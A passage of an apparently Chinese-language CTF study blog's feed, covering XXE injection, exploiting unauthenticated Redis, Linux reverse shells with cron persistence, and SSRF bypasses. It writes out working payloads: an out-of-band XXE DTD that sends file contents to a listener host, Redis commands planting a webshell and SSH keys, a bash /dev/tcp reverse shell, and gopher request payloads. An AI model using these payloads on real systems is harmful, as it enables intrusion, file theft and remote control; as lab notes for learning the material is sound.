class="line">&lt;b&gt;&amp;d;&lt;/b&gt;</span><br><span class="line">&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">最后输出abcd</span><br></pre></td></tr></table></figure><p>Blind XXE</p><p>盲XXE实验代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$xml=@simplexml_load_string($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>无法回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ELEMENT a (b)&gt;</span><br><span class="line">&lt;!ENTITY % c  SYSTEM &quot;file:///etc/passwd&quot;&gt; </span><br><span class="line">%c;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;</span><br><span class="line">&lt;b&gt;&lt;/b&gt;</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>可访问远程地址，在本地读取文件后通过远程访问携带数据。((OOB)out of band)带外</p><p>POST请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ELEMENT b ANY&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;url/payload.did&quot;&gt; </span><br><span class="line">%dtd;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&lt;b&gt;&lt;/b&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>在url使用wireshark抓包：请求payload.did，但是不存在。</p><p>方法：构建接受实体参数值的php页面，记录flag值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ELEMENT b ANY&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;file:///C:flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://本地ip/payload.did&quot;&gt; </span><br><span class="line">%dtd;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&lt;b&gt;&amp;send;&lt;/b&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>返回的内容</p><p>payload.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://本地ip:8888/?abc=%evil;&#x27;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>nc监听 8888端口，即可得到flag。</p><p>如果存在特殊字符的文件报错，使用php输入输出流读取文地文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=file:///c:/flag.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;XXE注入&quot;&gt;&lt;a href=&quot;#XXE注入&quot; class=&quot;headerlink&quot; title=&quot;XXE注入&quot;&gt;&lt;/a&gt;XXE注入&lt;/h3&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;xml外部实体注入漏洞。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意的外部文件，造成文件读取、命令执行等等。XXE漏洞触发点在可上传xml文件的位置，没有对上传的xml文件过滤，导致上传恶意的xml文件。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Redis未授权访问漏洞利用与防御</title>
    <link href="http://example.com/2021/05/27/CTF-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
    <id>http://example.com/2021/05/27/CTF-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/</id>
    <published>2021-05-27T13:13:49.000Z</published>
    <updated>2021-07-27T01:41:52.059Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Redis未授权访问漏洞利用与防御"><a href="#Redis未授权访问漏洞利用与防御" class="headerlink" title="Redis未授权访问漏洞利用与防御"></a>Redis未授权访问漏洞利用与防御</h3><h4 id="Redis漏洞"><a href="#Redis漏洞" class="headerlink" title="Redis漏洞"></a>Redis漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redis配置不当可导致未授权访问，被恶意利用。部分服务器上的Redis绑定在0.0.0.0：6379,并且没有开启认证(这是Redis的默认配置)，以及该端口可通过公网直接访问，如果没有采取相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，将会导致Redis服务器直接暴露在公网上，可能造成其他用户直接在非授权情况下直接访问呢Redis服务并进行相关操作。</span><br></pre></td></tr></table></figure><span id="more"></span><h4 id="Redis服务实验环境搭建"><a href="#Redis服务实验环境搭建" class="headerlink" title="Redis服务实验环境搭建"></a>Redis服务实验环境搭建</h4><p>kali linux下环境搭建：</p><p>1、Redis安装包下载与安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line">tar xzf redis-3.2.0</span><br><span class="line">cd redis-3.2.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>2、配置Redis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">1、bind 127.0.0.1 前面加上#</span><br><span class="line">2、protected-mode设为no</span><br></pre></td></tr></table></figure><p>3、加载配置文件启动Redis服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">redis-server ../redis-conf</span><br></pre></td></tr></table></figure><p>4、查看6379端口是否启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 6379 --script redis-info +redis服务器ip地址</span><br></pre></td></tr></table></figure><p>通过连接redis服务，执行info命令，探测出当前redis存在未授权访问漏洞</p><p>Redis客户端连接服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h +redis服务器ip地址</span><br></pre></td></tr></table></figure><h4 id="Redis未授权漏洞利用"><a href="#Redis未授权漏洞利用" class="headerlink" title="Redis未授权漏洞利用"></a>Redis未授权漏洞利用</h4><p>利用漏洞 写入webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">set x &quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php </span><br><span class="line">save\\保存文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由可写webshell到指定路径，就可以写其他具有权限的文件，如计划任务，ssh密钥文件。</span><br></pre></td></tr></table></figure><h4 id="Redis漏洞防御"><a href="#Redis漏洞防御" class="headerlink" title="Redis漏洞防御"></a>Redis漏洞防御</h4><p>1、增加密码认证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#requirepass foobared</span><br><span class="line">requirepass +密码</span><br></pre></td></tr></table></figure><p>2、绑定内网ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure><h4 id="Redis未授权添加ssh密钥"><a href="#Redis未授权添加ssh密钥" class="headerlink" title="Redis未授权添加ssh密钥"></a>Redis未授权添加ssh密钥</h4><p>1、nmap探测目标是否存在redis服务(6379)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 端口 ip</span><br></pre></td></tr></table></figure><p>2、测试redis服务是否存在未授权访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 服务端地址</span><br><span class="line">info</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、ssh密钥生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd ~/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt;public.txt</span><br><span class="line">两个换行</span><br></pre></td></tr></table></figure><p>4、 上传密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat public.txt |redis-cli -h ip -x set x //将文件内容读取到变量x，通过-x执行相关命令，相当于set x=public.txt文件内容</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dir &quot;/home/user/.ssh/&quot; user需要破解，可尝试直接访问/~/.ssh/</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">redis-cli -h ip save </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh -l user -i id_rsa ip</span><br><span class="line">连接失败</span><br><span class="line">扫描22端口</span><br><span class="line">nmap -p 22 ip</span><br><span class="line">22端口关闭</span><br><span class="line">扫描所有端口</span><br><span class="line">namp -p 1-65535 -T4 -n -v ip</span><br><span class="line"></span><br><span class="line">发现一个novation服务也是ssh服务标识</span><br><span class="line"></span><br><span class="line">ssh -l user -p 1322 -i</span><br><span class="line">用户名还是需要爆破的，后面连接需要用到。</span><br><span class="line">不具有最高权限</span><br></pre></td></tr></table></figure><p>5、提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uname -a </span><br><span class="line">查看版本相关信息</span><br><span class="line">百度搜索相关漏洞</span><br><span class="line">https://www.exploit-db.com/</span><br><span class="line"></span><br><span class="line">mkdir tmp</span><br><span class="line">cd tmp</span><br><span class="line">wget ... poc.c 下载相关漏洞</span><br><span class="line">gcc poc.c </span><br><span class="line">然后执行新生成的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;Redis未授权访问漏洞利用与防御&quot;&gt;&lt;a href=&quot;#Redis未授权访问漏洞利用与防御&quot; class=&quot;headerlink&quot; title=&quot;Redis未授权访问漏洞利用与防御&quot;&gt;&lt;/a&gt;Redis未授权访问漏洞利用与防御&lt;/h3&gt;&lt;h4 id=&quot;Redis漏洞&quot;&gt;&lt;a href=&quot;#Redis漏洞&quot; class=&quot;headerlink&quot; title=&quot;Redis漏洞&quot;&gt;&lt;/a&gt;Redis漏洞&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Redis配置不当可导致未授权访问，被恶意利用。部分服务器上的Redis绑定在0.0.0.0：6379,并且没有开启认证(这是Redis的默认配置)，以及该端口可通过公网直接访问，如果没有采取相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，将会导致Redis服务器直接暴露在公网上，可能造成其他用户直接在非授权情况下直接访问呢Redis服务并进行相关操作。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Linux-基础知识</title>
    <link href="http://example.com/2021/05/25/Linux-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://example.com/2021/05/25/Linux-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
    <published>2021-05-25T12:44:21.000Z</published>
    <updated>2021-07-27T01:42:15.850Z</updated>
    
    <content type="html"><![CDATA[<h3 id="linux基础知识"><a href="#linux基础知识" class="headerlink" title="linux基础知识"></a>linux基础知识</h3><h4 id="linux反弹shell命令"><a href="#linux反弹shell命令" class="headerlink" title="linux反弹shell命令"></a>linux反弹shell命令</h4><span id="more"></span><p><strong>监听服务端</strong></p><p>使用netcat进行监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp +端口号(可任意设置未使用位置)</span><br></pre></td></tr></table></figure><p><strong>反弹客户端</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp;/dev/tcp/服务端ip地址/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-i  用户输入命令进行执行</span><br><span class="line"></span><br><span class="line">&gt;&amp;    将bash -i 交互执行结构 重定向(&gt;)并不做结果输出(&amp;)</span><br><span class="line"></span><br><span class="line">/dev/tcp/服务端ip地址/4444 基于TCP连接到 ip和端口位置</span><br><span class="line"></span><br><span class="line">0&gt;&gt;&amp;1    将获得输入重定向保存到输出中，这样监听端可获取输入与输出都显示的效果</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行完毕后不会进行任何输出，此时监听服务端得到反弹的shell连接。</p><p>此时获得反弹服务端的shell，可执行任意命令。但是一旦客户端关闭shell窗口，此时连接中断。为了可持久反弹，可用定时任务。</p><h4 id="linux定时任务"><a href="#linux定时任务" class="headerlink" title="linux定时任务"></a>linux定时任务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用于设置Linux进行周期性执行某种任务等某些事件的操作。类似windows下</span><br><span class="line">的计划任务。</span><br></pre></td></tr></table></figure><p>在linux下可通过crontab进行计划任务的编写与浏览</p><p><strong>1、查看当前用户的定时任务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p><strong>2、编辑任务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">*/1 * * * *+任务每分钟执行</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以在/var/spool/cron目录下 新建用户自定义的文件(以用户名命名)，编写计划任务。</p><p>对于该命令是否执行，可通过/var/log/cron.log查看日志是否执行任务。</p><p>如果没有日志记录，可编辑/etc/rsyslog.conf，将cron前的注释去掉，同时使用命令重启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service rsyslog restart</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;linux基础知识&quot;&gt;&lt;a href=&quot;#linux基础知识&quot; class=&quot;headerlink&quot; title=&quot;linux基础知识&quot;&gt;&lt;/a&gt;linux基础知识&lt;/h3&gt;&lt;h4 id=&quot;linux反弹shell命令&quot;&gt;&lt;a href=&quot;#linux反弹shell命令&quot; class=&quot;headerlink&quot; title=&quot;linux反弹shell命令&quot;&gt;&lt;/a&gt;linux反弹shell命令&lt;/h4&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-SSRF</title>
    <link href="http://example.com/2021/05/25/CTF-SSRF/"/>
    <id>http://example.com/2021/05/25/CTF-SSRF/</id>
    <published>2021-05-25T00:55:43.000Z</published>
    <updated>2021-07-27T01:42:38.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-SSRF"><a href="#CTF-SSRF" class="headerlink" title="CTF-SSRF"></a>CTF-SSRF</h1><h3 id="SSRF介绍与简单介绍"><a href="#SSRF介绍与简单介绍" class="headerlink" title="SSRF介绍与简单介绍"></a>SSRF介绍与简单介绍</h3><p>原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务器请求伪造是一种由web服务器发出请求的漏洞，它能够请求到与它相连的内网资源。因此SSRF主要测试目标是企业的内网系统。</span><br></pre></td></tr></table></figure><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">很多web应用提供从其他服务器获取数据的功能，可根据用户提交URL访问对应资源(获取图片，下载文件，读取内容等)。</span><br><span class="line">如果该功能作为代理通道去访问本地或远程服务器，这就是所谓的SSRF。</span><br></pre></td></tr></table></figure><h4 id="SSRF可能造成的危害"><a href="#SSRF可能造成的危害" class="headerlink" title="SSRF可能造成的危害"></a>SSRF可能造成的危害</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、对内网进行信息探测-端口扫描</span><br><span class="line">2、对内网服务区进行漏洞扫描利用</span><br><span class="line">3、对内网web的应用进行安全测试，如Structs、Sql注入漏洞利用。</span><br><span class="line">4、对内网中的文件读取(file协议)</span><br><span class="line">5、在PHP环境中，如果搭建expect扩展，可能被命令执行。</span><br></pre></td></tr></table></figure><h4 id="SSRF-漏洞-常用函数"><a href="#SSRF-漏洞-常用函数" class="headerlink" title="SSRF 漏洞 常用函数"></a>SSRF 漏洞 常用函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、file_get_contents</span><br><span class="line">PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-将整个文件读入一个字符串。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2、fsockopen函数</span><br><span class="line">(PHP 4, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-打开一个网络连接或者一个Unix套接字连接</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl函数</span><br><span class="line">参考文档：https://www.php.net/manual/zh/book.curl.php</span><br><span class="line">PHP支持Daniel Stenberg创建的libcurl库，能够连接通讯各种服务器、使用各种协议。libcurl目前支持的协议有http、https、ftp、gopher、telnet、dict、file、ldap。libcurl同时支持HTTPS证书，HTTP POST、HTTP PUT、FTP上传(也能通过PHP的FTP扩展完成)、HTTP基于表单上传、代理、cookies、用户名+密码的认证。</span><br></pre></td></tr></table></figure><h3 id="SSRF绕过限制姿势"><a href="#SSRF绕过限制姿势" class="headerlink" title="SSRF绕过限制姿势"></a>SSRF绕过限制姿势</h3><h4 id="1、添加端口"><a href="#1、添加端口" class="headerlink" title="1、添加端口"></a>1、添加端口</h4><p>HTTP请求URL中默认以80端口。</p><h4 id="2、短网址"><a href="#2、短网址" class="headerlink" title="2、短网址"></a>2、短网址</h4><p><a href="https://sina.lt/">https://sina.lt/</a></p><h4 id="3、指定任意IP的域名xip-io"><a href="#3、指定任意IP的域名xip-io" class="headerlink" title="3、指定任意IP的域名xip.io"></a>3、指定任意IP的域名xip.io</h4><p><a href="https://xip.io/">https://xip.io/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1.xip.io</span><br><span class="line">www.127.0.0.1.xip.io</span><br><span class="line">mysite.127.0.0.1.xip.io</span><br><span class="line">foo.bar.127.0.0.1.xip.io</span><br></pre></td></tr></table></figure><h4 id="4、数制绕过"><a href="#4、数制绕过" class="headerlink" title="4、数制绕过"></a>4、数制绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IP地址是32位二进制数-&gt;4个字节</span><br><span class="line">目前看到的IP地址都是采用点分十进制组成的。</span><br><span class="line">127.0.0.1 -&gt;  01111111.00000000.00000000.00000001</span><br><span class="line">转化为十进制 -&gt; 2130706433</span><br><span class="line">八进制-&gt; 0177.00.00.01</span><br><span class="line">十六进制 -&gt; 0x7f.0x0.0x0.0x1</span><br></pre></td></tr></table></figure><h4 id="5、-跳转"><a href="#5、-跳转" class="headerlink" title="5、@跳转"></a>5、@跳转</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在URL中使用@可跳转到指定的URL</span><br><span class="line">http://www.baidu.com@127.0.0.1</span><br><span class="line">变成http://127.0.0.1</span><br><span class="line">https://www.baidu.com@127.0.0.1</span><br><span class="line">变成https://127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="SSRF可用协议"><a href="#SSRF可用协议" class="headerlink" title="SSRF可用协议"></a>SSRF可用协议</h3><h4 id="1、file协议"><a href="#1、file协议" class="headerlink" title="1、file协议"></a>1、file协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file：//文件路径</span><br></pre></td></tr></table></figure><h4 id="2、dict协议"><a href="#2、dict协议" class="headerlink" title="2、dict协议"></a>2、dict协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用dict协议可探测端口的开放情况和指纹信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令格式：</span><br><span class="line">dict://serverip:port/info</span><br><span class="line">dict://127.0.0.1:80/info</span><br></pre></td></tr></table></figure><h4 id="3、gopher协议"><a href="#3、gopher协议" class="headerlink" title="3、gopher协议"></a>3、gopher协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Gopher是internet上非常有名的信息查找系统，它将internet的文件组织成某种索引，很方便从internet的一处带到另一处。在www出现之前，Gopher是internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但是www出现之后，Gopher地位受到打击。Gopher协议在SSRF可以是一个万能协议，可进行GET、POST请求发送。</span><br></pre></td></tr></table></figure><p>构造Gopher数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">抓包后将整个数据包的</span><br><span class="line">空格替换成%20</span><br><span class="line">问好替换成%3f</span><br><span class="line">回车换行替换成%0d%0a</span><br><span class="line">最后一行也需要%0d%0a</span><br></pre></td></tr></table></figure><p><strong>gopher GET请求</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://ip:端口/_数据</span><br><span class="line"></span><br><span class="line">如</span><br><span class="line">curl gopher://127.0.0.1:端口/_GET%20/..../?a=...%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a</span><br></pre></td></tr></table></figure><p><strong>gopher POST请求</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">与get请求类似，但是需要传入更多的相关信息。</span><br><span class="line">必须有</span><br><span class="line"></span><br><span class="line">POST /.../ HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length:9</span><br><span class="line"></span><br><span class="line">a=xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最终变成</span><br><span class="line">curl gopher://_POST%20/.../%20HTTP/1.1%0d%0aHost:%20xxx%0d0aContent-Type:%20application/x-www-form-urlencoded%0d0aContent-Length%209%0d0a%0d0aa=xxx%0d%0a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特别注意 POST有两个换号位置。</span><br><span class="line">%0d%0a%0d%0a</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CTF-SSRF&quot;&gt;&lt;a href=&quot;#CTF-SSRF&quot; class=&quot;headerlink&quot; title=&quot;CTF-SSRF&quot;&gt;&lt;/a&gt;CTF-SSRF&lt;/h1&gt;&lt;h3 id=&quot;SSRF介绍与简单介绍&quot;&gt;&lt;a href=&quot;#SSRF介绍与简单介绍&quot; class=&quot;headerlink&quot; title=&quot;SSRF介绍与简单介绍&quot;&gt;&lt;/a&gt;SSRF介绍与简单介绍&lt;/h3&gt;&lt;p&gt;原理：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;服务器请求伪造是一种由web服务器发出请求的漏洞，它能够请求到与它相连的内网资源。因此SSRF主要测试目标是企业的内网系统。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
